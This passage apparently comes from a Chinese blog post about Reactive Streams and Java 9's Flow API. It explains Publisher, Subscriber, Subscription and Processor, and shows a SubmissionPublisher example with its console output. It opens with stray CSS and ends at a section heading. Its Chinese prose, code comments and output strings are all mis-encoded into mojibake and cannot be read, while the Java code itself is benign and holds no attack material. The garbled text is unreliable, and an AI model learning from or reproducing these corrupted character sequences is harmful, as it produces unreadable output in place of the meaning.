.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡å·²æ”¶å½•è‡³GitHubï¼Œæ¨èé˜…è¯» ğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBookSea4j%2FJavaRecord" target="_blank" title="https://github.com/BookSea4j/JavaRecord" ref="nofollow noopener noreferrer">Javaéšæƒ³å½•</a></p>
<p>å¾®ä¿¡å…¬ä¼—å·ï¼šJavaéšæƒ³å½•</p>
<h2 data-id="heading-0">Reactive Streams ä»‹ç»</h2>
<p>åœ¨èŠ Reactive Streams ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹ Reactive Programmingï¼ˆååº”å¼/å“åº”å¼ç¼–ç¨‹ï¼‰ã€‚ä¸ºäº†è§£å†³å¼‚æ­¥ç¼–ç¨‹ä¸­å‡ºç°çš„å„ç§é—®é¢˜ï¼Œç¨‹åºå‘˜ä»¬æå‡ºäº†å„ç§çš„æ€è·¯å»è§£å†³è¿™äº›é—®é¢˜ï¼Œè¿™äº›è§£å†³é—®é¢˜çš„æ–¹å¼ã€æ–¹æ³•ï¼Œæ‰‹æ®µå°±å¯ä»¥å«åš Reactive Programmingã€‚</p>
<p>Reactive Programming æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œç±»ä¼¼é¢å‘å¯¹è±¡ï¼Œå‡½æ•°å¼ç¼–ç¨‹ã€‚</p>
<p>æœ¬è´¨ä¸Šæ˜¯å¯¹æ•°æ®æµæˆ–æŸç§å˜åŒ–åšå‡ºçš„ååº”ï¼Œè¿™ä¸ªå˜åŒ–ä»€ä¹ˆæ—¶å€™è§¦å‘æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥ä»–æ˜¯ä¸€ç§åŸºäºå¼‚æ­¥ã€å›è°ƒçš„æ–¹å¼åœ¨å¤„ç†é—®é¢˜ã€‚</p>
<p>å½“è¶Šæ¥è¶Šå¤šçš„ç¨‹åºå‘˜ï¼Œå¼€å§‹ä½¿ç”¨è¿™ç§ç¼–ç¨‹æ€æƒ³æ—¶ï¼Œéœ€è¦ä¸€äº›å¤§ä½¬æ¥ç»Ÿä¸€ä¸€ä¸ªæ€æƒ³è§„èŒƒã€‚æ‰€ä»¥å›½å¤–çš„å‡ ä¸ªå¤§ä½¬å…¬å¸å¯åŠ¨äº† Reactive Streams é¡¹ç›®ã€‚Netflixã€Pivotalã€Lightbend è”åˆæ¥ä¸ºå¼‚æ­¥æµå¤„ç†æä¾›æ ‡å‡†ï¼Œè§„èŒƒã€‚</p>
<p>Reactive Streams ç¿»è¯‘è¿‡æ¥å°±æ˜¯å“åº”å¼/ååº”å¼æµã€‚<strong>å…¶å®æ˜¯ä¸€ç§åŸºäºå¼‚æ­¥æµå¤„ç†çš„æ ‡å‡†åŒ–è§„èŒƒï¼Œç›®çš„æ˜¯åœ¨ä½¿ç”¨æµå¤„ç†æ—¶æ›´åŠ å¯é ï¼Œé«˜æ•ˆå’Œå“åº”å¼ã€‚</strong></p>
<h2 data-id="heading-1">Java å±‚é¢çš„ Reactive Streams</h2>
<p>åŸºäºè¿™ä¸ªè§„èŒƒçš„å®ç°å¾ˆå¤šï¼Œæ¯”å¦‚ä¸‰æ–¹åº“ä¸­æ¯”è¾ƒå‡ºåçš„ RxJavaï¼ŒReactor ç­‰ç­‰ã€‚</p>
<p>ä½†æ˜¯ JDK8 ç‰ˆæœ¬ä¸­ï¼ŒJava å·²ç»æœ‰äº† CompletableFuture çš„æ”¯æ’‘ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¤§é‡çš„å¼‚æ­¥ä»»åŠ¡åšå¥½ç¼–æ’ã€‚ä½†æ˜¯åœ¨ JDK8 ç‰ˆæœ¬ä¸­çš„ CompletableFuture ä¾ç„¶æœ‰å¾ˆå¤šç‰¹æ€§æ— æ³•æ”¯æ’‘ã€‚æ‰€ä»¥åœ¨ JDK9ï¼ŒCompletableFuture åšäº†å¾ˆå¤šçš„æ›´æ–°ï¼Œæ¯”å¦‚æ”¯æŒå»¶è¿Ÿï¼Œè¶…æ—¶ï¼Œå­ç±»åŒ–ä¹‹ç±»çš„åŠŸèƒ½ã€‚</p>
<p>è¿™æ—¶ï¼Œå’±ä»¬ä¼šå‘ç°ï¼Œå…¶å® CompletableFuture å·²ç»å¯ä»¥å»æ”¯æ’‘åšä¸€äº›å¼‚æ­¥ç¼–ç¨‹çš„æ“ä½œäº†ã€‚ä½†æ˜¯ä¸ºä»€ä¹ˆå¾ˆå¤šå¤§å…¬å¸ä¾ç„¶è¿˜æ˜¯ä½¿ç”¨ RxJavaï¼ŒReactor è¿™ç§ä¸‰æ–¹ä¾èµ–åº“å‘¢ï¼Ÿ</p>
<p>é—®é¢˜åœ¨äºï¼Œå¤§å¤šæ•°çš„æ—¶å€™ï¼Œå’±ä»¬é‡‡ç”¨å¼‚æ­¥ç¼–ç¨‹å¤„ç†çš„ä»»åŠ¡å¹¶ä¸æ˜¯éå¸¸å¤æ‚çš„ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå’±ä»¬ç¡®å®ä¸éœ€è¦å»ä½¿ç”¨ Reactive Streams ååº”æµçš„æ¡†æ¶ã€‚å¦‚æœç³»ç»Ÿè¶Šæ¥è¶Šå¤æ‚ï¼Œæˆ–è€…ä½ å¤„ç†çš„ä¸šåŠ¡æœ¬èº«å°±æ˜¯åŠå…¶å¤æ‚çš„é‚£ç§ï¼Œä½ å°±è¦å»å†™ä¸€ä¸ªè®©äººå¤´çš®å‘éº»çš„ä»£ç äº†ã€‚éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¿™ç§ä»£ç ä¼šå˜æˆéå¸¸éš¾ä»¥ç»´æŠ¤ã€‚</p>
<p>å…¶æ¬¡ CompletableFuture å¹¶ä¸æ˜¯çœŸæ­£çš„åŸºäº Reactive Streams å»å®ç°ã€‚CompletableFuture æè¿°çš„æ˜¯å•æ¬¡æ‰§è¡Œçš„ç»“æœã€‚å°½ç®¡å¯ä»¥é€šè¿‡å„ç§æ–¹æ³•å°†å¼‚æ­¥ä»»åŠ¡ä¹‹é—´æ„å»ºæˆä¸€ä¸²ä»»åŠ¡ç»„æˆçš„æµç¨‹å›¾ï¼Œæœ¬è´¨ä¸Šä¾ç„¶æ˜¯å•æ¬¡çš„ç»“æœã€‚</p>
<p>ååº”å¼æµï¼Œé¢å‘çš„æ˜¯ Streamã€‚ å’±ä»¬ Java ä¸­çš„ Stream API æ›´ç±»ä¼¼ Reactive Streams çš„æ€æƒ³ã€‚Stream API æ˜¯åŒæ­¥é˜»å¡çš„ã€‚</p>
<p>æœ€ç»å…¸çš„å°±æ˜¯ CompletableFuture æ— æ³•å¤„ç† Reactive Streams ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼ŒBack Pressureï¼ˆèƒŒå‹ï¼Œåå‹ï¼Œå›å‹ï¼‰ï¼Œæ¯”å¦‚åœ¨ä¸Šä¸‹æ¸¸æ‰¿è½½èƒ½åŠ›ä¸åŒæ—¶ï¼Œæ¯”å¦‚ä¸‹æ¸¸ç©ä¸è½¬äº†ï¼Œéœ€è¦å‘ŠçŸ¥ä¸Šæ¸¸é‡‡å–ä¸€äº›ç­–ç•¥å»è§£å†³ã€‚CompletableFuture æ˜æ˜¾æ— æ³•å¤„ç†è¿™ç§ã€‚</p>
<p>å…¶æ¬¡è¿˜æœ‰ Java ä¸­æä¾›çš„å›è°ƒï¼ŒFuture æœºåˆ¶åœ¨å®ç°å“åº”å¼ç¼–ç¨‹ä¸­ï¼Œé—®é¢˜å’Œç¼ºç‚¹éƒ½æ¯”è¾ƒéš¾å¤„ç†ã€‚æœ‰ä¸ªæ¯”è¾ƒå‡ºåçš„æ¦‚å¿µå«åš Callback Hellï¼ˆå›è°ƒåœ°ç‹±ï¼‰ã€‚ç®€å•æ¥è¯´å°±æ˜¯å›è°ƒé‡Œé¢å¥—å›è°ƒï¼Œè™½ç„¶å°†å­è¿‡ç¨‹åšåˆ°è§£è€¦ï¼Œä½†æ˜¯éšç€ä¸šåŠ¡çš„è´Ÿè´£ï¼Œå›è°ƒä»£ç çš„å¯è¯»æ€§ã€å¤æ‚æ€§å°±å¤§å¤§çš„å¢åŠ ï¼Œè¿™ä¸ªå°±æ˜¯å›è°ƒåœ°ç‹±ã€‚</p>
<p>æ‰€ä»¥ï¼Œå’±ä»¬éœ€è¦ä¸€å¥—æ¡†æ¶æˆ–è€…è¯´ç±»åº“æ¥å®ç°çœŸæ­£å“åº”å¼æµï¼Œå¤§æ¦‚éœ€è¦å‡ ä¸ªç‰¹æ€§ï¼š</p>
<ul>
<li>æ”¯æŒå°†å¼‚æ­¥ä»»åŠ¡åšå°è£…ä»¥åŠç»„è£…ï¼Œéœ€è¦ API å¯¹å¼‚æ­¥ä»»åŠ¡è¿›è¡ŒåŒ…è£…ï¼Œå¹¶ä¸”éœ€è¦å¾ˆå¤šå­ä»»åŠ¡æ¥å¯¹å¼‚æ­¥æ“ä½œè¿›è¡Œé“¾å¼ç»„è£…ï¼Œè¿‡ç¨‹ä¸­åŒ…æ‹¬è¿‡æ»¤ï¼Œå¼‚å¸¸å¤„ç†ï¼Œè¶…æ—¶ç­‰ç­‰æ“ä½œã€‚</li>
<li>å‡å°‘å¼‚æ­¥ä»»åŠ¡çš„åµŒå¥—ï¼Œå‡å°‘ä»£ç çš„å¤æ‚æ€§ï¼Œå¢åŠ å¯è¯»æ€§ï¼Œé¿å… Callback Hell è¿™ç§åŠå…¶å¤æ‚æ¶å¿ƒçš„ä»£ç ã€‚</li>
<li>æ”¯æŒèƒŒå‹ Back Pressureï¼Œä¹Ÿå°±éœ€è¦æœ‰ä¸Šæ¸¸å’Œä¸‹æ¸¸çš„æ¦‚å¿µï¼Œå¯ä»¥åšåˆ°åå•†å¤„ç†æ•°æ®æµçš„é€Ÿåº¦ã€‚</li>
</ul>
<h2 data-id="heading-2">Java å±‚é¢ Reactive Steams çš„ API</h2>
<p>é¦–å…ˆ Reactive Steams å“åº”æµå®ç°æ–¹å¼å…¶å®æ˜¯åŸºäºè§‚å¯Ÿè€…æ¨¡å¼çš„æ‰©å±•ï¼ŒåŒæ—¶ä¹Ÿèƒ½çœ‹åˆ°å‘å¸ƒè®¢é˜…æ¨¡å¼ï¼Œè´£ä»»é“¾æ¨¡å¼ç­‰ç­‰ã€‚</p>
<p>æ•´ä¸ª Reactive Steams æµç¨‹å¤§è‡´å¦‚ä¸‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9592c871e5e40f1be90efcf888187cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=TSgTt3xeOZBxptm6EuAjG8vQSSg%3D" alt="" loading="lazy"/></p>
<p>ç›´æ¥åœ¨ JDK9 ç‰ˆæœ¬ä¹‹ä¸ŠæŸ¥çœ‹ Doug Lee æä¾›çš„ Flow ç±»ã€‚</p>
<p>åœ¨ Flow ç±»ä¸­ï¼Œæä¾›äº†æ ¸å¿ƒçš„å››ä¸ªæ¥å£ï¼šPublisherï¼ŒSubscriberï¼ŒSubscriptionï¼ŒProcessor</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09f5138c2bb440098f904bb47b27b6ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=7316XjMXvFoj2HFpvI5fx5Tv08I%3D" alt="" loading="lazy"/></p>
<p>Publisherï¼šPublisher æ˜¯å‡½æ•°å¼æ¥å£ï¼Œè´Ÿè´£å‘å¸ƒæ•°æ®çš„ã€‚ Publisher å†…éƒ¨æœ‰ä¸€ä¸ªæ–¹æ³• subscribe æ–¹æ³•ï¼Œå»å’Œå…·ä½“çš„è®¢é˜…è€…ç»‘å®šå…³ç³»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd5da1cce0a48768a6c10bd3325c266~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=0yFzU%2FEhU6cf%2FLDc%2FhYGO%2FgDKY8%3D" alt="" loading="lazy"/></p>
<p>Subscriberï¼šSubscriber æ˜¯è®¢é˜…è€…ï¼Œè´Ÿè´£è®¢é˜…ï¼Œæ¶ˆè´¹æ•°æ®ã€‚å››ä¸ªæ–¹æ³•ï¼š</p>
<ul>
<li>onSubscribeï¼šè®¢é˜…æˆåŠŸåè§¦å‘ï¼Œå¹¶ä¸”è¡¨æ˜å¯ä»¥å¼€å§‹æ¥æ”¶å‘å¸ƒè€…çš„æ•°æ®å…ƒç´ äº†ã€‚</li>
<li>onNextï¼šæ¯æ¬¡è·å–åˆ°å‘å¸ƒè€…çš„æ•°æ®å…ƒç´ éƒ½ä¼šæ‰§è¡Œ onNextã€‚</li>
<li>onErrorï¼šæ¥æ”¶æ•°æ®å…ƒç´ æ—¶ï¼Œå‡ºç°å¼‚å¸¸ç­‰é—®é¢˜æ—¶ï¼Œèµ° onErrorã€‚</li>
<li>onCompleteï¼šå½“æŒ‡å®šæ¥æ”¶çš„å…ƒç´ ä¸ªæ•°æå®šåï¼Œè§¦å‘ onCompleteã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b00cfd018c9e4d6d9eab9109a953eac6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=KN1vhpT34Ny2FvK3c39OX73WOuI%3D" alt="" loading="lazy"/></p>
<p>Subscriptionï¼šå‘å¸ƒè€…å’Œè®¢é˜…è€…æ˜¯åŸºäº Subscription å…³è”çš„ã€‚å½“å»ºç«‹äº†è®¢é˜…çš„å…³ç³»åï¼Œå‘å¸ƒè€…ä¼šå°† Subscription ä¼ é€’ç»™è®¢é˜…è€…ã€‚è®¢é˜…è€…æŒ‡å®šè·å–å…ƒç´ çš„æ•°é‡å’Œå–æ¶ˆè®¢é˜…æ“ä½œï¼Œéƒ½è¦åŸºäº Subscription å»æ“ä½œã€‚æä¾›äº†ä¸¤ä¸ªæ–¹æ³•ï¼š</p>
<ul>
<li>requestï¼šè®¢é˜…è€…è¦è·å–çš„å…ƒç´ ä¸ªæ•°ã€‚</li>
<li>cancelï¼šå–æ¶ˆè®¢é˜…ï¼Œå½“å‰çš„è®¢é˜…è€…ä¸æ¥æ”¶å½“å‰å‘å¸ƒè€…çš„å…ƒç´ ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c68ad044b9374c3eab14b2f3b49f13c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=Jpp0h1Y6ZxFtnBsdj86KdC4YnpI%3D" alt="" loading="lazy"/></p>
<p>Processorï¼šProcessor ç»§æ‰¿äº† Publisher å’Œ Subscriberï¼Œå³æ˜¯å‘å¸ƒè€…ä¹Ÿæ˜¯è®¢é˜…è€…ã€‚Processor ä¸€èˆ¬ä½œä¸ºæ•°æ®çš„ä¸­è½¬ï¼Œè®¢é˜…è€…å¤„ç†å®Œæ•°æ®å…ƒç´ ï¼Œå¯ä»¥å†æ¬¡å‘ç»™ä¸‹ä¸€ä¸ªè®¢é˜…è€…ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a42047a535c9423995491f68ce606ee3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=xtE0ChJLm8qslq46IFzHStHC4YA%3D" alt="" loading="lazy"/></p>
<p>è¿™å››ä¸ªæ¥å£å¾ˆé‡è¦ï¼Œæ˜¯ Reactive Streams çš„è§„èŒƒï¼Œä½†æ˜¯å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°ï¼Œå†…éƒ¨æ²¡æœ‰å…·ä½“çš„å†…å®¹å®ç°ã€‚</p>
<p>è¿™é‡Œå°±ç±»ä¼¼ JDBC è¿™ç§è§„èŒƒï¼Œè§„èŒƒåœ¨ JDK9 ä¸­æå‡ºæ¥äº†ï¼Œæƒ³å®ç°ï¼Œå¯ä»¥åŸºäºå½“å‰çš„è¿™å››ä¸ªæ¥å£å†åšå…·ä½“çš„é€»è¾‘å¤„ç†ä»¥åŠå®ç°çš„ç»†èŠ‚ã€‚</p>
<h2 data-id="heading-3">Java å±‚é¢ Reactive Steams åŸºæœ¬æ“ä½œ</h2>
<p>å’±ä»¬æµ‹è¯• Java ä¸­çš„ Flow é‡Œæä¾›çš„ API æ—¶ï¼Œå°±æ˜¯èµ°æœ€åŸºæœ¬çš„æ“ä½œã€‚</p>
<p>å…¶ä¸­ Processor ä¸éœ€è¦é‡å†™ï¼Œç©æœ€åŸºæœ¬çš„æ“ä½œï¼Œä¸å»åšè®¢é˜…è€…å’Œå‘å¸ƒè€…çš„è½¬æ¢ã€‚</p>
<p>å…¶æ¬¡ Subscription ä¹Ÿä¸éœ€è¦é‡å†™ï¼Œè¿™ä¸œè¥¿å°±æ˜¯æä¾›äº†è®¢é˜…è€…æŒ‡å®šè®¢é˜…çš„æ¶ˆæ¯ä¸ªæ•°ï¼Œä»¥åŠå–æ¶ˆçš„æ“ä½œã€‚</p>
<p>ç„¶å Publisher éœ€è¦é‡å†™ï¼Œä½†æ˜¯ JDK ä¸­å·²ç»æä¾›äº†ä¸€ä¸ª Publisher çš„å®ç°ï¼ŒSubmissionPublisherï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p>
<p>æœ€åï¼ŒSubscriber éœ€è¦å’±ä»¬è‡ªå·±é‡å†™ï¼ŒæŒ‡å®šå¥½è®¢é˜…æ¶ˆæ¯çš„ä¸ªæ•°ï¼Œå·²ç»æ¶ˆè´¹çš„ä¸€äº›é€»è¾‘</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.Flow;


<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySubscriber</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Flow</span>.Subscriber&lt;Integer&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-comment">// ç»‘å®šå¥½è®¢é˜…å…³ç³»åï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(Flow.Subscription subscription)</span> {
        subscription.request(<span class="hljs-number">10</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(Integer item)</span> {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š"</span> + item);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"ï¼šæ¥æ”¶æ¶ˆæ¯å‡ºç°å¼‚å¸¸ï¼š"</span> + throwable.getMessage());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"ï¼šå½“å‰è®¢é˜…è€…è¦æ±‚æ¥æ”¶çš„æ¶ˆæ¯å…¨éƒ¨å¤„ç†å®Œæ¯•ã€‚"</span>);
    }
}
</code></pre>
<p>ç›´æ¥ä½¿ç”¨ SubmissionPublisher æµ‹è¯•æ•´ä½“æ•ˆæœ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    <span class="hljs-comment">// åªæœ‰ä¸€ä¸ªå·¥ä½œçº¿ç¨‹çš„çº¿ç¨‹æ± </span>
    <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">1</span>);
    <span class="hljs-comment">// æŒ‡å®šç¼“å†²åŒºçš„å¤§å°</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">maxBufferCapacity</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;

    <span class="hljs-comment">// éœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°</span>
    <span class="hljs-comment">// ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¼ é€’ä¸€ä¸ªçº¿ç¨‹æ± ï¼ŒæŒ‡å®šè®¢é˜…è€…ä½¿ç”¨çš„çº¿ç¨‹</span>
    <span class="hljs-comment">// ç¬¬äºŒä¸ªå‚æ•°ï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªç¼“å†²åŒºï¼Œå‘å¸ƒè€…å‘å¸ƒæ¶ˆæ¯åï¼Œæ¶ˆæ¯ä¼šæ‰”åˆ°ç¼“å†²åŒºé‡Œã€‚</span>
    SubmissionPublisher&lt;Integer&gt; publisher = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubmissionPublisher</span>&lt;&gt;(executor,maxBufferCapacity);

    <span class="hljs-comment">// ç»‘å®šè®¢é˜…è€…</span>
    <span class="hljs-type">MySubscriber</span> <span class="hljs-variable">subscriber</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySubscriber</span>();
    publisher.subscribe(subscriber);

    <span class="hljs-comment">// å‘å¸ƒæ¶ˆæ¯</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š"</span> + i);
        publisher.submit(i);
    }

    <span class="hljs-comment">// é‡Šæ”¾èµ„æº</span>
    publisher.close();
    executor.shutdown();
}
</code></pre>
<p>ç»“æœè¾“å‡ºå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">0</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">1</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">2</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">3</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">4</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">5</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">6</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">7</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">8</span>
<span class="hljs-selector-tag">main</span>ï¼šå‘å¸ƒæ¶ˆæ¯ï¼š<span class="hljs-number">9</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">0</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">1</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">2</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">3</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">4</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">5</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">6</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">7</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">8</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šæ¥æ”¶åˆ°æ•°æ®æµï¼š<span class="hljs-number">9</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>ï¼šå½“å‰è®¢é˜…è€…è¦æ±‚æ¥æ”¶çš„æ¶ˆæ¯å…¨éƒ¨å¤„ç†å®Œæ¯•ã€‚
</code></pre>
<ul>
<li><strong>ç¼“å†²åŒºï¼š</strong> ç¼“å†²åŒºå°±æ˜¯å‘å¸ƒè€…å’Œè®¢é˜…è€…ä¹‹é—´çš„ä¸€å—å†…å­˜ï¼Œç±»ä¼¼çº¿ç¨‹æ± ä¸­çš„é˜»å¡é˜Ÿåˆ—ï¼Œå¯ä»¥å°†æ¶ˆæ¯æ‰”åˆ°è¿™ä¸ªç¼“å­˜åŒºé‡Œã€‚å…¶æ¬¡å’±ä»¬è®¾ç½®çš„ç¼“å†²åŒºå¤§å°æ˜¯ 5ï¼Œä½†æ˜¯å‘ç° get å‡ºæ¥çš„æ—¶å€™ï¼Œ5 è¢«æ›¿æ¢ä¸ºäº† 8ã€‚è¿™æ˜¯å› ä¸º SubmissionPublisher ä¸ºäº†æ›´æœ‰æ•ˆçš„ä½¿ç”¨å†…å­˜ï¼Œé»˜è®¤ä¼šåŸºäº roundCapacity æ–¹æ³•å°†ä¼ é€’çš„ç¼“å†²åŒºå¤§å°æ›¿æ¢ä¸º 2 çš„ n æ¬¡å¹‚ã€‚</li>
<li><strong>èƒŒå‹æ•ˆæœï¼š</strong> å½“è®¢é˜…è€…æŒ‡å®šçš„æ¶ˆæ¯å·²ç»å…¨éƒ¨å¤„ç†å®Œæ¯•åï¼Œå‘å¸ƒè€…æœ€å¤šåªèƒ½å‘å¸ƒç¼“å†²åŒºå¤§å°ä¸ªæ•°çš„æ¶ˆæ¯ï¼Œå‰©ä¸‹çš„å†…å®¹ä¼šåŸºäºèƒŒå‹çš„æ•ˆæœç›´æ¥æš‚æ—¶ä¸å‘é€ã€‚</li>
<li><strong>onCompleteï¼š</strong> éœ€è¦å‘å¸ƒè€…åšäº†close æ“ä½œï¼Œç¡®è®¤äº†å‘å¸ƒè€…å·²ç»å°†æ¶ˆæ¯å…¨éƒ¨å‘é€ï¼Œå¹¶ä¸”è®¢é˜…è€…ä¹Ÿå·²ç»å°†å…¨éƒ¨çš„æ¶ˆæ¯å¤„ç†å®Œæ¯•åï¼Œæ‰ä¼šè§¦å‘ onCompleteã€‚</li>
<li><strong>Subscriptionï¼š</strong> è®¢é˜…è€…å¯ä»¥åœ¨ onNext æˆ–è€…å…¶ä»–æ–¹æ³•ä¸­åŠ¨æ€çš„ä½¿ç”¨ subscription å»æŒ‡å®šåç»­éœ€è¦å‡ ä¸ªæ¶ˆæ¯è®¢é˜…ï¼Œä»¥åŠæ˜¯å¦éœ€è¦å–æ¶ˆè®¢é˜…æ¶ˆæ¯ç­‰æ“ä½œã€‚</li>
</ul>
<h2 data-id="heading-4">Reactive Steams è½åœ°ä½“éªŒ</h2>
<h3 data-id="heading-5">å›è°ƒåœ°ç‹±é—®é¢˜</h3>
